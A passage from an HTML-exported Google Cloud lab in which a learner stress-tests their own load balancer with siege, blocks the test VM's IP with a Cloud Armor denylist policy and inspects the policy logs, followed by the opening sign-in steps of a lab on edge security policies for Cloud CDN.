</span><strong><code>Region 1</code><span>-mig</span></strong><span> (unless the load is too high).</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>Wait for the </span><strong><span>siege-vm</span></strong><span> instance to be created.</span></p></li><li><p><span>For </span><strong><span>siege-vm</span></strong><span>, click </span><strong><span>SSH</span></strong><span> to launch a terminal and connect.</span></p></li><li><p><span>Run the following command, to install siege:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get -y install siege</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>To store the IPv4 address of the Application Load Balancer in an environment variable, run the following command, replacing </span><code>[LB_IP_v4]</code><span> with the IPv4 address:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">export LB_IP=[LB_IP_v4]</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>To simulate a load, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">siege -c 150 -t120s http://$LB_IP</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>In the Cloud console, click </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; click </span><strong><span>VIEW ALL PRODUCTS</span></strong><span> &gt; </span><strong><span>Networking</span></strong><span> &gt; </span><strong><span>Network Services</span></strong><span> &gt; </span><strong><span>Load balancing</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Backends</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>http-backend</span></strong><span>.</span></p></li><li><p><span>Navigate to </span><strong><span>http-lb</span></strong><span>.</span></p></li><li><p><span>Click on the </span><strong><span>Monitoring</span></strong><span> tab.</span></p></li><li><p><span>Monitor the </span><strong><span>Frontend Location (Total inbound traffic)</span></strong><span> between North America and the two backends for 2 to 3 minutes.</span></p></li></ol><p><span>At first, traffic should just be directed to </span><strong><code>Region 1</code><span>-mig</span></strong><span> but as the RPS increases, traffic is also directed to </span><strong><code>Region 2</code></strong><span>.</span></p><p><span>This demonstrates that by default traffic is forwarded to the closest backend but if the load is very high, traffic can be distributed across the backends.</span></p><ol start='' ><li><p><span>Return to the </span><strong><span>SSH</span></strong><span> terminal of </span><strong><span>siege-vm</span></strong><span>.</span></p></li><li><p><span>Press </span><strong><span>CTRL+C</span></strong><span> to stop siege if it&#39;s still running.</span></p></li></ol><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">New configuration template added to /home/student-02-dd02c94b8808/.siege</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Run siege -C to view the current settings in that file</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{ &nbsp; &nbsp; &nbsp; "transactions": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  24729,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "availability": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 100.00,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "elapsed_time": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 119.07,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "data_transferred": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 3.77,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "response_time": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  0.66,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "transaction_rate": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 207.68,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "throughput": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0.03,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "concurrency": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  137.64,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "successful_transactions": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 24729,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "failed_transactions": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "longest_transaction": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 10.45,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  "shortest_transaction": &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0.03</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 338px;"></div><div class="CodeMirror-gutters" style="display: none; height: 338px;"></div></div></div></pre><h3 id='task-5-denylist-the-siege-vm'><span>Task 5. Denylist the siege-vm</span></h3><p><span>Use Cloud Armor to denylist the </span><strong><span>siege-vm</span></strong><span> from accessing the Application Load Balancer.</span></p><h4 id='create-the-security-policy'><span>Create the security policy</span></h4><p><span>Create a Cloud Armor security policy with a denylist rule for the </span><strong><span>siege-vm</span></strong><span>.</span></p><ol start='' ><li><p><span>In the console, navigate to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM instances</span></strong><span>.</span></p></li><li><p><span>Note the </span><strong><span>External IP</span></strong><span> of the </span><strong><span>siege-vm</span></strong><span>. This will be referred to as </span><code>[SIEGE_IP]</code><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> There are ways to identify the external IP address of a client trying to access your Application Load Balancer. For example, you could examine traffic captured by </span><a href='https://cloud.google.com/vpc/docs/using-flow-logs#exporting_logs_to_bigquery_name_short_pubsub_name_short_and_custom_targets'><span>VPC Flow Logs in BigQuery</span></a><span> to determine a high volume of incoming requests.</span></p><ol start='' ><li><p><span>In the Cloud console, click </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; click </span><strong><span>VIEW ALL PRODUCTS</span></strong><span> &gt; </span><strong><span>Networking</span></strong><span> &gt; </span><strong><span>Network Security</span></strong><span> &gt; </span><strong><span>Cloud Armor policies</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create policy</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>denylist-siege</span></td></tr><tr><td style='text-align:left;' ><span>Default rule action</span></td><td style='text-align:left;' ><span>Allow</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Next step</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Add a rule</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Condition &gt; Match</span></td><td style='text-align:left;' ><em><span>Enter the SIEGE_IP</span></em></td></tr><tr><td style='text-align:left;' ><span>Action</span></td><td style='text-align:left;' ><span>Deny</span></td></tr><tr><td style='text-align:left;' ><span>Response code</span></td><td style='text-align:left;' ><span>403 (Forbidden)</span></td></tr><tr><td style='text-align:left;' ><span>Priority</span></td><td style='text-align:left;' ><span>1000</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Save Change to Rule</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Next step</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Add Target</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Type</span></strong><span>, select </span><strong><span>Backend service (external application load balancer)</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Target</span></strong><span>, select </span><strong><span>http-backend</span></strong><span> and if prompted confirm </span><strong><span>Replace</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create policy</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Alternatively, you could set the default rule to </span><strong><span>Deny</span></strong><span> and only allowlist or allow traffic from authorized users/IP addresses.</span></p><ol start='' ><li><p><span>Wait for the policy to be created before moving to the next step.</span></p></li></ol><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Denylist the siege-vm</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='verify-the-security-policy-3'><span>Verify the security policy</span></h4><p><span>Verify that the </span><strong><span>siege-vm</span></strong><span> cannot access the Application Load Balancer.</span></p><ol start='' ><li><p><span>Return to the </span><strong><span>SSH</span></strong><span> terminal of </span><strong><span>siege-vm</span></strong><span>.</span></p></li><li><p><span>To access the load balancer, run the following:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl http://$LB_IP</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;!doctype html&gt;&lt;meta charset="utf-8"&gt;&lt;meta name=viewport content="width=device-width, initial-scale=1"&gt;&lt;title&gt;403&lt;/title&gt;403 Forbidden</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> It might take a couple of minutes for the security policy to take effect. If you are able to access the backends, keep trying until you get the </span><strong><span>403 Forbidden error</span></strong><span>.</span></p><ol start='' ><li><p><span>Open a new tab in your browser and navigate to </span><code>http://[LB_IP_v4]</code><span>. Make sure to replace </span><code>[LB_IP_v4]</code><span> with the IPv4 address of the load balancer.</span></p></li></ol><p><strong><span>Note:</span></strong><span> You can access the Application Load Balancer from your browser because of the default rule to </span><strong><span>allow</span></strong><span> traffic; however, you cannot access it from the </span><strong><span>siege-vm</span></strong><span> because of the </span><strong><span>deny</span></strong><span> rule that you implemented.</span></p><ol start='' ><li><p><span>Back in the SSH terminal of siege-vm, to simulate a load, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">siege -c 150 -t120s http://$LB_IP</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The command will not generate any output.</span></p><p><span>Explore the security policy logs to determine if this traffic is also blocked.</span></p><ol start='' ><li><p><span>In the console, navigate to </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>Network Security</span></strong><span> &gt; </span><strong><span>Cloud Armor Policies</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>denylist-siege</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Logs</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>View policy logs</span></strong><span>.</span></p></li><li><p><span>On the Logging page, make sure to clear all the text in the </span><strong><span>Query preview</span></strong><span>. Select resource to </span><strong><span>Application Load Balancer</span></strong><span> &gt; </span><strong><span>http-lb-forwarding-rule</span></strong><span> &gt; </span><strong><span>http-lb</span></strong><span> then click </span><strong><span>Apply</span></strong><span>.</span></p></li><li><p><span>Now click </span><strong><span>Run Query</span></strong><span>.</span></p></li><li><p><span>Expand a log entry in </span><strong><span>Query results</span></strong><span>.</span></p></li><li><p><span>Expand </span><strong><span>httpRequest</span></strong><span>.</span></p></li></ol><p><span>The request should be from the </span><strong><span>siege-vm</span></strong><span> IP address. If not, expand another log entry.</span></p><ol start='' ><li><p><span>Expand </span><strong><span>jsonPayload</span></strong><span>.</span></p></li><li><p><span>Expand </span><strong><span>enforcedSecurityPolicy</span></strong><span>.</span></p></li><li><p><span>Notice that the </span><strong><span>configuredAction</span></strong><span> is to </span><code>DENY</code><span> with the </span><strong><span>name</span></strong><span> </span><code>denylist-siege</code><span>.</span></p></li></ol><p><img src="images\kf8dX3SIyN706oBbZhyrAEC%2B9goZrVR%2BzWKqn0is0OM%3D" referrerpolicy="no-referrer" alt="Query results page"></p><p><span>Cloud Armor security policies create logs that can be explored to determine when traffic is denied and when it is allowed, along with the source of the traffic.</span></p><h3 id='congratulations-23'><span>Congratulations!</span></h3><p><span>You configured an Application Load Balancer with backends in </span><code>Region 1</code><span> and </span><code>Region 2</code><span>. Then, you stress tested the Load Balancer with a VM and denylisted the IP address of that VM with Cloud Armor. You were able to explore the security policy logs to identify why the traffic was blocked.</span></p><p>&nbsp;</p><h2 id='lab---defending-edge-cache-with-cloud-armor-2'><span>LAB - Defending Edge Cache with Cloud Armor</span></h2><h3 id='overview-27'><span>Overview</span></h3><p><a href='https://cloud.google.com/armor'><span>Google Cloud Armor</span></a><span> </span><a href='https://cloud.google.com/armor/docs/security-policy-overview#edge-policies'><span>edge security policies</span></a><span> allow you to restrict access to cached objects on </span><a href='https://cloud.google.com/cdn'><span>Cloud CDN</span></a><span> (Content Delivery Network) and Cloud Storage. Edge security policies are deployed and enforced at the outermost perimeter of Google&#39;s network, upstream of where the Cloud CDN cache resides. Reasons to do this include ensuring that your users do not access objects in storage buckets from restricted geographies, or ensuring that your media distribution is filtering on the geographies that you have a license to do so.</span></p><p><span>In this lab you create a Google Cloud Storage bucket, upload an image to it, bind it to a load balancer, and then enable Cloud CDN and Cloud Armor edge security policies on it.</span></p><h4 id='what-youll-learn-4'><span>What you&#39;ll learn</span></h4><p><span>In this lab, you learn how to:</span></p><ul><li><p><span>Set up a Cloud Storage Bucket with cacheable content</span></p></li><li><p><span>Create an edge security policy to protect the content</span></p></li><li><p><span>Validate that the edge security policy is working as expected</span></p></li></ul><h3 id='setup-and-requirements-24'><span>Setup and requirements</span></h3><h4 id='before-you-click-the-start-lab-button-10'><span>Before you click the Start Lab button</span></h4><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h4 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console-6'><span>How to start your lab and sign in to the Google Cloud console</span></h4><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:</span></p><ul><li><p><span>The Open Google Cloud console button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the Sign in page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"Username"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Username in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror 